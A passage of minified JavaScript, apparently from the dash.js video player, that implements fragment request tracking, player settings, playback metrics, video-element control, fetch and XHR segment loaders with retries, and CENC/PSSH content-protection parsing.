E(R){R.sender===N&&I.trigger(L.FRAGMENT_LOADING_PROGRESS,{request:R.request,response:R.response,error:R.error,sender:this})}function D(R){R.sender===N&&I.trigger(L.FRAGMENT_LOADING_ABANDONED,{streamId:h,request:R.request,mediaType:R.mediaType})}var I=(f=f||{}).eventBus,L=f.events,G=f.dashMetrics,N=f.fragmentLoader,w=f.debug,h=f.streamId,F=void 0,P=void 0,O=void 0;return f={getRequests:function(R){var Q=[];return(R?R.state instanceof Array?R.state:[R.state]:[]).forEach((function(ja){var W,aa;ja=function(W){switch(W){case"loading":W=O;break;case"executed":W=P;break;default:W=[]}return W}(ja),Q=Q.concat((W=ja,(aa=R).hasOwnProperty("time")?[function(ma,H,B){for(var A=ma.length-1;0<=A;A--){var Y=ma[A],Z=Y.startTime,na=Z+Y.duration;if(B=isNaN(B)?t(Y):B,!isNaN(Z)&&!isNaN(na)&&Z<=H+B&&H-B<na||isNaN(Z)&&isNaN(H))return Y}return null}(W,aa.time,aa.threshold)]:W.filter((function(ma){for(var H in aa)if("state"!==H&&aa.hasOwnProperty(H)&&ma[H]!=aa[H])return!1;return!0}))))})),Q},isFragmentLoaded:g,isFragmentLoadedOrPending:function(R){var Q,ja;if(!(Q=g(R)))for(ja=0;ja<O.length;ja++){var W=O[ja];R.url===W.url&&R.startTime===W.startTime&&(Q=!0)}return Q},removeExecutedRequestsBeforeTime:r,removeExecutedRequestsAfterTime:function(R){P=P.filter((function(Q){return isNaN(Q.startTime)||void 0!==R&&Q.startTime<R}))},syncExecutedRequestsWithBufferedRange:function(R,Q){if(R&&0!==R.length){for(var ja=0,W=0,aa=R.length;W<aa;W++)x(ja,R.start(W)),ja=R.end(W);0<Q&&x(ja,Q)}else r()},abortRequests:function(){N.abort(),O=[]},executeRequest:function(R){switch(R.action){case l.default.ACTION_COMPLETE:P.push(R),z(R,"executed"),F.debug("STREAM_COMPLETED"),I.trigger(L.STREAM_COMPLETED,{request:R});break;case l.default.ACTION_DOWNLOAD:z(R,"loading"),O.push(R),I.trigger(L.FRAGMENT_LOADING_STARTED,{streamId:h,request:R}),N.load(R);break;default:F.warn("Unknown request action.")}},reset:function(){I.off(L.LOADING_COMPLETED,J,this),I.off(L.LOADING_DATA_PROGRESS,E,this),I.off(L.LOADING_ABANDONED,D,this),N&&N.reset(),P=[],O=[]},addExecutedRequest:function(R){P.push(R)}},F=w.getLogger(f),P=[],O=[],I.on(L.LOADING_COMPLETED,J,f),I.on(L.LOADING_DATA_PROGRESS,E,f),I.on(L.LOADING_ABANDONED,D,f),f}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(227));m.__dashjs_factory_name="FragmentModel",(u=p.default.getClassFactory(m)).FRAGMENT_MODEL_LOADING="loading",u.FRAGMENT_MODEL_EXECUTED="executed",u.FRAGMENT_MODEL_CANCELED="canceled",u.FRAGMENT_MODEL_FAILED="failed",p.default.updateClassFactory(m.__dashjs_factory_name,u),M.default=u,da.exports=M.default},{227:227,47:47}],150:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(){var f=this.context,g=(0,p.default)(f).getInstance(),t=void 0;return{getValue:function(){return t},setValue:function(r){(t=r)&&g.trigger(l.default.MANIFEST_LOADED,{data:r})}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(46)),l=v(u(54));u=v(u(47)),m.__dashjs_factory_name="ManifestModel",M.default=u.default.getSingletonFactory(m),da.exports=M.default},{46:46,47:47,54:54}],151:[function(u,da,M){function v(x){return x&&x.__esModule?x:{default:x}}function m(){function x(F){var P;for(P=0;P<G.length;P++)if(G[P].rulename===F)return P;return-1}function z(){return h.get().streaming.lowLatencyEnabled?h.get().streaming.liveDelay||3:h.get().streaming.liveDelay}function J(F,P){E(F,P);var O=new p.default;O.schemeIdUri=F,O.value=P,I.push(O)}function E(F,P){(0,r.checkParameterType)(F,"string"),(0,r.checkParameterType)(P,"string"),I.forEach((function(O,R){O.schemeIdUri===F&&O.value===P&&I.splice(R,1)}))}var D,I=void 0,L=void 0,G=void 0,N={scheme:"urn:mpeg:dash:utc:http-xsdate:2014",value:"http://time.akamai.com/?iso&ms"},w=this.context,h=(0,t.default)(w).getInstance();return D={getABRCustomRules:function(){return G},addABRCustomRule:function(F,P,O){if("string"!=typeof F||F!==g.default.ABANDON_FRAGMENT_RULES&&F!==g.default.QUALITY_SWITCH_RULES||"string"!=typeof P)throw f.default.BAD_ARGUMENT_ERROR;var R=x(P);-1===R?G.push({type:F,rulename:P,rule:O}):(G[R].type=F,G[R].rule=O)},removeABRCustomRule:function(F){var P;F?-1!==(P=x(F))&&G.splice(P,1):G=[]},getStableBufferTime:function(){if(h.get().streaming.lowLatencyEnabled)return.6*z();var F=h.get().streaming.stableBufferTime;return-1<F?F:h.get().streaming.fastSwitchEnabled?20:12},getRetryAttemptsForType:function(F){var P=isNaN(h.get().streaming.retryAttempts.lowLatencyMultiplyFactor)?5:h.get().streaming.retryAttempts.lowLatencyMultiplyFactor;return h.get().streaming.lowLatencyEnabled?h.get().streaming.retryAttempts[F]*P:h.get().streaming.retryAttempts[F]},getRetryIntervalsForType:function(F){var P=isNaN(h.get().streaming.retryIntervals.lowLatencyReductionFactor)?10:h.get().streaming.retryIntervals.lowLatencyReductionFactor;return h.get().streaming.lowLatencyEnabled?h.get().streaming.retryIntervals[F]/P:h.get().streaming.retryIntervals[F]},getLiveDelay:z,getLiveCatchupLatencyThreshold:function(){try{var F=h.get().streaming.liveCatchupLatencyThreshold,P=z();if(null!==F&&!isNaN(F))return Math.max(F,P);var O=h.get().streaming.liveCatchUpMinDrift,R=!isNaN(P)&&P?isNaN(O)?z():h.get().streaming.liveCatchUpMinDrift+z():NaN;return R&&!isNaN(R)?2*R:NaN}catch(Q){return NaN}},addUTCTimingSource:J,removeUTCTimingSource:E,getUTCTimingSources:function(){return I},clearDefaultUTCTimingSources:function(){I=[]},restoreDefaultUTCTimingSources:function(){J(N.scheme,N.value)},setXHRWithCredentialsForType:function R(P,O){P?L[P]=!!O:Object.keys(L).forEach((function(Q){R(Q,O)}))},getXHRWithCredentialsForType:function(P){return void 0===(P=L[P])?L.default:P},getDefaultUtcTimingSource:function(){return N},reset:function(){}},L={default:!(I=[])},G=[],D}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(96)),l=v(u(47)),f=v(u(108)),g=v(u(189)),t=v(u(48)),r=u(218);m.__dashjs_factory_name="MediaPlayerModel",M.default=l.default.getSingletonFactory(m),da.exports=M.default},{108:108,189:189,218:218,47:47,48:48,96:96}],152:[function(u,da,M){function v(N){return N&&N.__esModule?N:{default:N}}function m(N){function w(ma){W.trigger(G.default.METRIC_CHANGED,{mediaType:ma}),W.trigger(G.default.METRICS_CHANGED)}function h(ma,H,B){W.trigger(G.default.METRIC_UPDATED,{mediaType:ma,metric:H,value:B}),w(ma)}function F(ma,H,B){W.trigger(G.default.METRIC_ADDED,{mediaType:ma,metric:H,value:B}),w(ma)}function P(ma,H){var B=null;return ma&&(aa.hasOwnProperty(ma)?B=aa[ma]:H||(B=new f.default,aa[ma]=B)),B}function O(ma,H,B){null!==(ma=P(ma))&&(ma[H].push(B),ma[H].length>ja.get().streaming.metricsMaxListDepth&&ma[H].shift())}function R(ma,H,B){O(ma,H,B),F(ma,H,B)}var Q,ja=(N=N||{}).settings;N=this.context;var W=(0,I.default)(N).getInstance(),aa=void 0;return Q={clearCurrentMetricsForType:function(ma){delete aa[ma],w(ma)},clearAllCurrentMetrics:function(){aa={},W.trigger(G.default.METRICS_CHANGED)},getMetricsFor:P,addHttpRequest:function la(H,B,A,Y,Z,na,T,pa,ia,S,V,oa,ba,ha,ka){var C=new g.HTTPRequest;na&&na!==Y&&(la(H,null,A,Y,Z,null,null,pa,ia,null,null,null,ba,null,null),C.actualurl=na),C.tcpid=B,C.type=A,C.url=Y,C.range=pa,C.trequest=ia,C.tresponse=S,C.responsecode=oa,C._tfinish=V,C._stream=H,C._mediaduration=ba,C._quality=Z,C._responseHeaders=ha,C._serviceLocation=T,ka?ka.forEach((function(fa){var qa,va=fa.s,xa=fa.d;fa=fa.b,(qa=new g.HTTPRequestTrace).s=va,qa.d=xa,qa.b=fa,C.trace.push(qa),C.interval||(C.interval=0),C.interval+=xa})):(delete C.interval,delete C.trace),R(H,l.default.HTTP_REQUEST,C)},addRepresentationSwitch:function(H,B,A,Y,Z){var na=new t.default;na.t=B,na.mt=A,na.to=Y,Z?na.lto=Z:delete na.lto,R(H,l.default.TRACK_SWITCH,na)},addBufferLevel:function(H,B,A){var Y=new r.default;Y.t=B,Y.level=A,R(H,l.default.BUFFER_LEVEL,Y)},addBufferState:function(H,B,A){var Y=new x.default;Y.target=A,Y.state=B,R(H,l.default.BUFFER_STATE,Y)},addDVRInfo:function(H,B,A,Y){var Z=new z.default;Z.time=B,Z.range=Y,Z.manifestInfo=A,R(H,l.default.DVR_INFO,Z)},addDroppedFrames:function(H,B){var A=new J.default,Y=P(H).DroppedFrames;B&&(A.time=B.creationTime,A.droppedFrames=B.droppedVideoFrames,0<Y.length&&Y[Y.length-1]==A||R(H,l.default.DROPPED_FRAMES,A))},addSchedulingInfo:function(H,B,A,Y,Z,na,T,pa,ia){var S=new D.default;S.mediaType=H,S.t=B,S.type=A,S.startTime=Y,S.availabilityStartTime=Z,S.duration=na,S.quality=T,S.range=pa,S.state=ia,R(H,l.default.SCHEDULING_INFO,S)},addRequestsQueue:function(H,B,A){var Y=new L.default;Y.loadingRequests=B,Y.executedRequests=A,P(H).RequestsQueue=Y,F(H,l.default.REQUESTS_QUEUE,Y)},addManifestUpdate:function(H,B,A,Y,Z,na,T,pa,ia,S){var V=new E.ManifestUpdate;V.mediaType=H,V.type=B,V.requestTime=A,V.fetchTime=Y,V.availabilityStartTime=Z,V.presentationStartTime=na,V.clientTimeOffset=T,V.currentTime=pa,V.buffered=ia,V.latency=S,O(p.default.STREAM,l.default.MANIFEST_UPDATE,V),F(H,l.default.MANIFEST_UPDATE,V)},updateManifestUpdateInfo:function(H,B){if(H){for(var A in B)H[A]=B[A];h(H.mediaType,l.default.MANIFEST_UPDATE,H)}},addManifestUpdateStreamInfo:function(H,B,A,Y,Z){var na;H&&((na=new E.ManifestUpdateStreamInfo).id=B,na.index=A,na.start=Y,na.duration=Z,H.streamInfo.push(na),h(H.mediaType,l.default.MANIFEST_UPDATE_STREAM_INFO,H))},addManifestUpdateRepresentationInfo:function(H,B,A,Y,Z,na,T,pa){var ia;H&&H.representationInfo&&((ia=new E.ManifestUpdateRepresentationInfo).id=B,ia.index=A,ia.streamIndex=Y,ia.mediaType=Z,ia.startNumber=T,ia.fragmentInfoType=pa,ia.presentationTimeOffset=na,H.representationInfo.push(ia),h(H.mediaType,l.default.MANIFEST_UPDATE_TRACK_INFO,H))},addPlayList:function(H){H.trace&&Array.isArray(H.trace)?H.trace.forEach((function(B){B.hasOwnProperty("subreplevel")&&!B.subreplevel&&delete B.subreplevel})):delete H.trace,R(p.default.STREAM,l.default.PLAY_LIST,H)},addDVBErrors:function(H){R(p.default.STREAM,l.default.DVB_ERRORS,H)}},aa={},Q}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(109)),f=v(u(231)),g=u(241),t=v(u(244)),r=v(u(237)),x=v(u(238)),z=v(u(239)),J=v(u(240)),E=u(242),D=v(u(246)),I=v(u(46)),L=v(u(245)),G=v(u(54));u=v(u(47)),m.__dashjs_factory_name="MetricsModel",M.default=u.default.getSingletonFactory(m),da.exports=M.default},{108:108,109:109,231:231,237:237,238:238,239:239,240:240,241:241,242:242,244:244,245:245,246:246,46:46,47:47,54:54}],153:[function(u,da,M){function v(l){return l&&l.__esModule?l:{default:l}}function m(){var l=void 0;return{initialize:function(f){if(l=new p.default,!f)return null;var g=f.indexOf("#");if(-1!==g){f=f.substr(g+1).split("&"),g=0;for(var t=f.length;g<t;++g){var r,x=f[g],z=x.indexOf("=");-1!==z&&(r=x.substring(0,z),l.hasOwnProperty(r)&&(l[r]=x.substr(z+1)))}}},getURIFragmentData:function(){return l}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(236));u=v(u(47)),m.__dashjs_factory_name="URIFragmentModel",M.default=u.default.getSingletonFactory(m),da.exports=M.default},{236:236,47:47}],154:[function(u,da,M){function v(t){return t&&t.__esModule?t:{default:t}}function m(){function t(){I&&(I.playbackRate=G||1,I.removeEventListener("canplay",t))}function r(F){I&&(2>=I.readyState&&0<F?I.addEventListener("canplay",t):I.playbackRate=F)}function x(){var F;I&&0<h.length&&0===I.playbackRate&&((F=document.createEvent("Event")).initEvent("waiting",!0,!1),I.dispatchEvent(F))}function z(){return I?I.buffered:null}function J(F,P,O,R,Q){if(I)for(var ja=0;ja<I.textTracks.length;ja++)if(I.textTracks[ja].kind===F&&(!P||I.textTracks[ja].label==P)&&I.textTracks[ja].language===O&&I.textTracks[ja].isTTML===R&&I.textTracks[ja].isEmbedded===Q)return I.textTracks[ja];return null}var E,D=void 0,I=void 0,L=void 0,G=void 0,N=this.context,w=(0,l.default)(N).getInstance(),h=[];return E={initialize:function(){w.on(f.default.PLAYBACK_PLAYING,x,this)},setCurrentTime:function(F,P){if(I&&I.currentTime!=F)try{F=P?function(O){var R=z(),Q=O,ja=9999999999;if(R)for(var W=0;W<R.length;W++){var aa=R.start(W),ma=R.end(W),H=Math.abs(aa-O),B=Math.abs(ma-O);if(aa<=O&&O<=ma)return O;H<ja&&(ja=H,Q=aa),B<ja&&(ja=B,Q=ma)}return Q}(F):F,I.currentTime=F}catch(O){0===I.readyState&&O.code===O.INVALID_STATE_ERR&&setTimeout((function(){I.currentTime=F}),400)}},play:function(){var F;I&&(I.autoplay=!0,(F=I.play())&&F.catch&&"undefined"!=typeof Promise&&F.catch((function(P){"NotAllowedError"===P.name&&w.trigger(f.default.PLAYBACK_NOT_ALLOWED),D.warn("Caught pending play exception - continuing ("+P+")")})))},isPaused:function(){return I?I.paused:null},pause:function(){I&&(I.pause(),I.autoplay=!1)},isSeeking:function(){return I?I.seeking:null},getTime:function(){return I?I.currentTime:null},getPlaybackRate:function(){return I?I.playbackRate:null},setPlaybackRate:r,getPlayedRanges:function(){return I?I.played:null},getEnded:function(){return I?I.ended:null},setStallState:function(F,P){(P?function(O){var R=void 0;null===O||I.seeking||-1!==h.indexOf(O)||(h.push(O),I&&1===h.length&&((R=document.createEvent("Event")).initEvent("waiting",!0,!1),G=I.playbackRate,r(0),I.dispatchEvent(R)))}:function(O){var R=h.indexOf(O),Q=void 0;null!==O&&(-1!==R&&h.splice(R,1),I&&0==0<h.length&&0===I.playbackRate&&(r(G||1),I.paused||((Q=document.createEvent("Event")).initEvent("playing",!0,!1),I.dispatchEvent(Q))))})(F)},getElement:function(){return I},setElement:function(F){if(!(null==F||F&&/^(VIDEO|AUDIO)$/i.test(F.nodeName)))throw"element is not video or audio DOM type!";(I=F)&&(I.preload="auto")},setSource:function(F){I&&(F?I.src=F:(I.removeAttribute("src"),I.load()))},getSource:function(){return I?I.src:null},getTTMLRenderingDiv:function(){return L},setTTMLRenderingDiv:function(F){(L=F).style.position="absolute",L.style.display="flex",L.style.overflow="hidden",L.style.pointerEvents="none",L.style.top=0,L.style.left=0},getPlaybackQuality:function(){if(!I)return null;var F="webkitDroppedFrameCount"in I&&"webkitDecodedFrameCount"in I,P=null;return"getVideoPlaybackQuality"in I?P=I.getVideoPlaybackQuality():F&&(P={droppedVideoFrames:I.webkitDroppedFrameCount,totalVideoFrames:I.webkitDroppedFrameCount+I.webkitDecodedFrameCount,creationTime:new Date}),P},addEventListener:function(F,P){I&&I.addEventListener(F,P)},removeEventListener:function(F,P){I&&I.removeEventListener(F,P)},getReadyState:function(){return I?I.readyState:NaN},getBufferRange:z,getClientWidth:function(){return I?I.clientWidth:NaN},getClientHeight:function(){return I?I.clientHeight:NaN},getTextTracks:function(){return I?I.textTracks:[]},getTextTrack:J,addTextTrack:function(F,P,O,R,Q){if(!I)return null;var ja=J(F,P,O,R,Q);return ja||((ja=I.addTextTrack(F,P,O)).isEmbedded=Q,ja.isTTML=R),ja},appendChild:function(F){I&&(I.appendChild(F),void 0!==F.isTTML&&(I.textTracks[I.textTracks.length-1].isTTML=F.isTTML,I.textTracks[I.textTracks.length-1].isEmbedded=F.isEmbedded))},removeChild:function(F){I&&I.removeChild(F)},getVideoWidth:function(){return I?I.videoWidth:NaN},getVideoHeight:function(){return I?I.videoHeight:NaN},getVideoRelativeOffsetTop:function(){var F=I.parentNode.host||I.parentNode;return F?I.getBoundingClientRect().top-F.parentNode.getBoundingClientRect().top:NaN},getVideoRelativeOffsetLeft:function(){var F=I.parentNode.host||I.parentNode;return F?I.getBoundingClientRect().left-F.getBoundingClientRect().left:NaN},reset:function(){w.off(f.default.PLAYBACK_PLAYING,x,this)}},D=(0,g.default)(N).getInstance().getLogger(E),E}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(46)),f=v(u(54)),g=v(u(45));m.__dashjs_factory_name="VideoModel",M.default=p.default.getSingletonFactory(m),da.exports=M.default},{45:45,46:46,47:47,54:54}],155:[function(u,da,M){function v(p){function l(r,x){r.reader.read().then(x).catch((function(z){r.onerror&&200===r.response.status&&r.onerror(z)}))}function f(r,x){if(1<(r=r.filter((function(D){return D.bytes>x/4/r.length}))).length){var z=(J=0,E=(r[r.length-1].ts-r[0].ts)/r.length,r.forEach((function(D,I){var L;(I=r[I+1])&&(L=I.ts-D.ts,J+=L<E?L:0)})),{v:J});if("object"==typeof z)return z.v}var J,E;return null}var g=(p=p||{}).requestModifier,t=p.boxParser;return{load:function(r){var x=new Date,z=r.request,J=new Headers;z.range&&J.append("Range","bytes="+z.range),z.requestStartDate||(z.requestStartDate=x),g&&g.modifyRequestHeader({setRequestHeader:function(E,D){J.append(E,D)}}),x=void 0,"function"==typeof wa.AbortController&&(x=new AbortController,(r.abortController=x).signal.onabort=r.onabort),fetch(r.url,{method:r.method,headers:J,credentials:r.withCredentials?"include":void 0,signal:x?x.signal:void 0}).then((function(E){r.response||(r.response={}),r.response.status=E.status,r.response.statusText=E.statusText,r.response.responseURL=E.url,E.ok||r.onerror();var D="",I=!0,L=!1,G=void 0;try{for(var N,w=E.headers.keys()[Symbol.iterator]();!(I=(N=w.next()).done);I=!0){var h=N.value;D+=h+": "+E.headers.get(h)+"\r\n"}}catch(W){L=!0,G=W}finally{try{!I&&w.return&&w.return()}finally{if(L)throw G}}if(r.response.responseHeaders=D,!E.body)return E.arrayBuffer().then((function(W){W={loaded:(r.response.response=W).byteLength,total:W.byteLength,stream:!1},r.progress(W),r.onload(),r.onend()}));var F=parseInt(E.headers.get("Content-Length"),10),P=0,O=!1,R=new Uint8Array,Q=0;r.reader=E.body.getReader();var ja=[];l(r,(function ma(aa){var H,B,A,Y=aa.value;if(aa.done)return R&&(r.progress({loaded:P,total:isNaN(F)?P:F,lengthComputable:!0,time:f(ja,P),stream:!0}),r.response.response=R.buffer),r.onload(),void r.onend();if(Y&&0<Y.length){if(0===(aa=R).length)aa=Y;else{var Z=new Uint8Array(aa.length+Y.length);Z.set(aa),Z.set(Y,aa.length),aa=Z}R=aa,P+=Y.length,ja.push({ts:Date.now(),bytes:Y.length}),(H=t.findLastTopIsoBoxCompleted(["moov","mdat"],R,Q)).found?(B=H.lastCompletedOffset+H.size,R=B===R.length?(A=R,new Uint8Array):(A=new Uint8Array(R.subarray(0,B)),R.subarray(B)),r.progress({data:A.buffer,lengthComputable:!1,noTrace:!0}),Q=0):(Q=H.lastCompletedOffset,O||(r.progress({lengthComputable:!1,noTrace:!0}),O=!0))}l(r,ma)}))})).catch((function(E){r.onerror&&r.onerror(E)}))},abort:function(r){if(r.abortController)r.abortController.abort();else if(r.reader)try{r.reader.cancel(),r.onabort()}catch(x){}},calculateDownloadedTime:f}}var m;Object.defineProperty(M,"__esModule",{value:!0}),u=(m=u(47))&&m.__esModule?m:{default:m},v.__dashjs_factory_name="FetchLoader",m=u.default.getClassFactory(v),M.default=m,da.exports=M.default},{47:47}],156:[function(u,da,M){function v(J){return J&&J.__esModule?J:{default:J}}function m(J,E,D){return E in J?Object.defineProperty(J,E,{value:D,enumerable:!0,configurable:!0,writable:!0}):J[E]=D,J}function p(J){function E(aa,ma){function H(ka){na=!1,A.requestStartDate=T,A.requestEndDate=new Date,A.firstByteDate=A.firstByteDate||T,A.checkExistenceOnly||(N.addHttpRequest(A,S.response?S.response.responseURL:null,S.response?S.response.status:null,S.response&&S.response.getAllResponseHeaders?S.response.getAllResponseHeaders():S.response?S.response.responseHeaders:[],ka?Y:null),A.type===g.HTTPRequest.MPD_TYPE&&N.addManifestUpdate(A.type,A.requestStartDate,A.requestEndDate))}function B(){-1!==O.indexOf(S)&&(O.splice(O.indexOf(S),1),na&&(H(!1),0<ma?function(){ma--;var ka={config:aa};Q.push(ka),ka.timeout=setTimeout((function(){-1!==Q.indexOf(ka)&&(Q.splice(Q.indexOf(ka),1),E(aa,ma))}),w.getRetryIntervalsForType(A.type))}():(G.error(new r.default(ja[A.type],A.url+" is not available",{request:A,response:S.response})),aa.error&&aa.error(A,"error",S.response.statusText),aa.complete&&aa.complete(A,S.response.statusText))))}var A=aa.request,Y=[],Z=!0,na=!0,T=new Date,pa=T,ia=0,S=void 0;if(!h||!N||!G)throw Error("config object is not correct or missing");var V,oa=void 0;oa=P&&wa.fetch&&"arraybuffer"===A.responseType&&A.type===g.HTTPRequest.MEDIA_SEGMENT_TYPE?(0,f.default)(L).create({requestModifier:h,boxParser:F}):(0,l.default)(L).create({requestModifier:h});var ba=h.modifyRequestURL(A.url),ha=function(ka){try{var la=[],C=W.getQueryParameter(ka);return C&&la.push(C),la}catch(fa){return[]}}(A);S={url:ba=z.default.addAditionalQueryParameterToUrl(ba,ha),method:A.checkExistenceOnly?g.HTTPRequest.HEAD:g.HTTPRequest.GET,withCredentials:w.getXHRWithCredentialsForType(A.type),request:A,onload:function(){200<=S.response.status&&299>=S.response.status&&(H(!0),aa.success&&aa.success(S.response.response,S.response.statusText,S.response.responseURL),aa.complete&&aa.complete(A,S.response.statusText))},onend:B,onerror:B,progress:function(ka){var la=new Date;Z&&(Z=!1,(!ka.lengthComputable||ka.lengthComputable&&ka.total!==ka.loaded)&&(A.firstByteDate=la)),ka.lengthComputable&&(A.bytesLoaded=ka.loaded,A.bytesTotal=ka.total),ka.noTrace||(Y.push({s:pa,d:ka.time?ka.time:la.getTime()-pa.getTime(),b:[ka.loaded?ka.loaded-ia:0]}),pa=la,ia=ka.loaded),aa.progress&&ka&&aa.progress(ka)},onabort:function(){aa.abort&&aa.abort(A)},loader:oa},ba=(new Date).getTime(),isNaN(A.delayLoadingTime)||ba>=A.delayLoadingTime?(O.push(S),oa.load(S)):(V={httpRequest:S},R.push(V),V.delayTimeout=setTimeout((function(){if(-1!==R.indexOf(V)){R.splice(R.indexOf(V),1);try{pa=T=new Date,O.push(V.httpRequest),oa.load(V.httpRequest)}catch(ka){V.httpRequest.onerror()}}}),A.delayLoadingTime-ba))}J=J||{};var D,I,L=this.context,G=J.errHandler,N=J.dashMetrics,w=J.mediaPlayerModel,h=J.requestModifier,F=J.boxParser,P=J.useFetch||!1;J=J.errors;var O=void 0,R=void 0,Q=void 0,ja=void 0,W=void 0;return D={load:function(aa){aa.request?E(aa,w.getRetryAttemptsForType(aa.request.type)):aa.error&&aa.error(aa.request,"error")},abort:function(){Q.forEach((function(aa){clearTimeout(aa.timeout),aa.config.request&&aa.config.abort&&aa.config.abort(aa.config.request)})),Q=[],R.forEach((function(aa){return clearTimeout(aa.delayTimeout)})),R=[],O.forEach((function(aa){aa.onloadend=aa.onerror=aa.onprogress=void 0,aa.loader.abort(aa)})),O=[]}},O=[],R=[],Q=[],W=(0,x.default)(L).getInstance(),m(I={},g.HTTPRequest.MPD_TYPE,J.DOWNLOAD_ERROR_ID_MANIFEST_CODE),m(I,g.HTTPRequest.XLINK_EXPANSION_TYPE,J.DOWNLOAD_ERROR_ID_XLINK_CODE),m(I,g.HTTPRequest.INIT_SEGMENT_TYPE,J.DOWNLOAD_ERROR_ID_INITIALIZATION_CODE),m(I,g.HTTPRequest.MEDIA_SEGMENT_TYPE,J.DOWNLOAD_ERROR_ID_CONTENT_CODE),m(I,g.HTTPRequest.INDEX_SEGMENT_TYPE,J.DOWNLOAD_ERROR_ID_CONTENT_CODE),m(I,g.HTTPRequest.BITSTREAM_SWITCHING_SEGMENT_TYPE,J.DOWNLOAD_ERROR_ID_CONTENT_CODE),m(I,g.HTTPRequest.OTHER_TYPE,J.DOWNLOAD_ERROR_ID_CONTENT_CODE),ja=I,D}Object.defineProperty(M,"__esModule",{value:!0});var l=v(u(159)),f=v(u(155)),g=u(241),t=v(u(47)),r=v(u(225)),x=v(u(148)),z=v(u(49));p.__dashjs_factory_name="HTTPLoader",u=t.default.getClassFactory(p),M.default=u,da.exports=M.default},{148:148,155:155,159:159,225:225,241:241,47:47,49:49}],157:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(){function f(){g={}}var g=void 0;return f(),{getLoader:function(t){for(var r in g)if(g.hasOwnProperty(r)&&t.startsWith(r))return g[r];return l.default},registerLoader:function(t,r){g[t]=r},unregisterLoader:function(t){g[t]&&delete g[t]},unregisterAllLoader:f,reset:function(){f()}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(156));m.__dashjs_factory_name="SchemeLoaderFactory",u=p.default.getSingletonFactory(m),M.default=u,da.exports=M.default},{156:156,47:47}],158:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(f){f=f||{};var g=this.context,t=void 0,r=void 0;return t=(0,l.default)(g).getInstance(),{load:function(x){(r=t.getLoader(x&&x.request?x.request.url:null)(g).create({errHandler:f.errHandler,mediaPlayerModel:f.mediaPlayerModel,requestModifier:f.requestModifier,useFetch:f.useFetch||null,dashMetrics:f.dashMetrics,boxParser:f.boxParser?f.boxParser:null,constants:f.constants?f.constants:null,dashConstants:f.dashConstants?f.dashConstants:null,urlUtils:f.urlUtils?f.urlUtils:null,errors:f.errors})).load(x)},abort:function(){r&&r.abort()}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(157));m.__dashjs_factory_name="URLLoader",u=p.default.getClassFactory(m),M.default=u,da.exports=M.default},{157:157,47:47}],159:[function(u,da,M){function v(p){var l=(p=p||{}).requestModifier;return{load:function(f){var g=new Date,t=f.request,r=new XMLHttpRequest;r.open(f.method,f.url,!0),t.responseType&&(r.responseType=t.responseType),t.range&&r.setRequestHeader("Range","bytes="+t.range),t.requestStartDate||(t.requestStartDate=g),l&&(r=l.modifyRequestHeader(r)),r.withCredentials=f.withCredentials,r.onload=f.onload,r.onloadend=f.onend,r.onerror=f.onerror,r.onprogress=f.progress,r.onabort=f.onabort,r.send(),f.response=r},abort:function(f){(f=f.response).onloadend=f.onerror=f.onprogress=void 0,f.abort()}}}var m;Object.defineProperty(M,"__esModule",{value:!0}),u=(m=u(47))&&m.__esModule?m:{default:m},v.__dashjs_factory_name="XHRLoader",m=u.default.getClassFactory(v),M.default=m,da.exports=M.default},{47:47}],160:[function(u,da,M){function v(p,l){for(var f=0;f<l.length;f++){var g=l[f];g.enumerable=g.enumerable||!1,g.configurable=!0,"value"in g&&(g.writable=!0),Object.defineProperty(p,g.key,g)}}function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function")}var p,f;Object.defineProperty(M,"__esModule",{value:!0}),p=m,f=[{key:"findCencContentProtection",value:function(p){for(var l=null,f=0;f<p.length;++f){var g=p[f];"urn:mpeg:dash:mp4protection:2011"===g.schemeIdUri.toLowerCase()&&"cenc"===g.value.toLowerCase()&&(l=g)}return l}},{key:"getPSSHData",value:function(p){var l=8,f=new DataView(p),g=f.getUint8(l);return l+=20,0<g&&(l+=4+16*f.getUint32(l)),l+=4,p.slice(l)}},{key:"getPSSHForKeySystem",value:function(p,l){return l=m.parsePSSHList(l),p&&l.hasOwnProperty(p.uuid.toLowerCase())?l[p.uuid.toLowerCase()]:null}},{key:"parseInitDataFromContentProtection",value:function(p,l){return"pssh"in p?(p.pssh.__text=p.pssh.__text.replace(/\r?\n|\r/g,"").replace(/\s+/g,""),l.decodeArray(p.pssh.__text).buffer):null}},{key:"parsePSSHList",value:function(p){if(null==p)return[];p=new DataView(p.buffer||p);for(var l={},f=0;;){var g,t,r=f;if(f>=p.buffer.byteLength)break;if(g=f+p.getUint32(f),f+=4,1886614376===p.getUint32(f)&&(f+=4,0===(t=p.getUint8(f))||1===t)){f++,f+=3;var z,x="",J=void 0;for(z=0;4>z;z++)x+=1===(J=p.getUint8(f+z).toString(16)).length?"0"+J:J;for(f+=4,x+="-",z=0;2>z;z++)x+=1===(J=p.getUint8(f+z).toString(16)).length?"0"+J:J;for(f+=2,x+="-",z=0;2>z;z++)x+=1===(J=p.getUint8(f+z).toString(16)).length?"0"+J:J;for(f+=2,x+="-",z=0;2>z;z++)x+=1===(J=p.getUint8(f+z).toString(16)).length?"0"+J:J;for(f+=2,x+="-",z=0;6>z;z++)x+=1===(J=p.getUint8(f+z).toString(16)).length?"0"+J:J;f+=6,x=x.toLowerCase(),p.getUint32(f),l[x]=p.buffer.slice(r,g)}f=g}return l}}],f&&v(p,f),u=m,M.default=u,da.exports=M.default},{}],161:[function(u,da,M){function v(E){return E&&E.__esModule?E:{default:E}}function m(){function E(L,G){for(var N=0;N<G.length;N++){var w=G[N];if("function"==typeof L[w[Object.keys(w)[0]]])return w}return null}var D=void 0,I=this.context;return D={createProtectionSystem:function(L){var G=null,N=(0,l.default)(I).getInstance();N.setConfig({debug:L.debug,BASE64:L.BASE64}),N.initialize();var 